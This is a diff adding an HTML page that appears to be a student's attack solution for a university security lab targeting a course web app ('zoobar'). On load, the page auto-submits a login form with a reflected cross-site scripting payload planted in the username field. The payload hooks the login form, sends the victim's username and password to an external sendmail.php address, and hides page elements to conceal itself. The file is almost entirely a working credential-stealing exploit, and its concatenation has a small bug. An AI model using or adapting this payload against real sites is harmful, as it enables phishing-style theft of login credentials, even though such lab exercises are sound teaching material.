@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+	<head>
+		<script type="text/javascript">
+			window.onload = function(){
+				var attack_str=escape("document.getElementsByName('login_form')[0].addEventListener('submit', function(){(new Image()).src='http://ece568.csl.toronto.edu/a3/sendmail.php?' + 'to=wangjiec' + '&netid=yourusername' + '&payload=' + document.getElementsByName('loginusername')[0].value + document.getElementsByName('loginpassword')[0].value; + '&random=' + Math.random();  [].forEach.call(document.getElementsByClassName('profileupdate'),function(eachPU){eachPU.style.display='none';});");
+				document.getElementsByName("loginusername")[0].value="'' onfocus=(function(){eval(unescape('" + attack_str + "'));})();";
+				document.getElementsByName("login_form")[0].submit();
+
+			};
+		</script>
+	</head>
+	<body>
+		<form name="login_form" method="POST" action="http://zoobar.csl.toronto.edu/">
+			  <input name="loginusername" size="30" autocomplete="no" value="" type="text">
+			  <input name="loginpassword" size="30" autocomplete="no" type="password">
+			  <input name="submitlogin" value="Log in" type="submit">
+			  <input name="submit_registration" value="Register" type="submit"></td>
+		</form>
+	</body>
+</html>
+
+
+
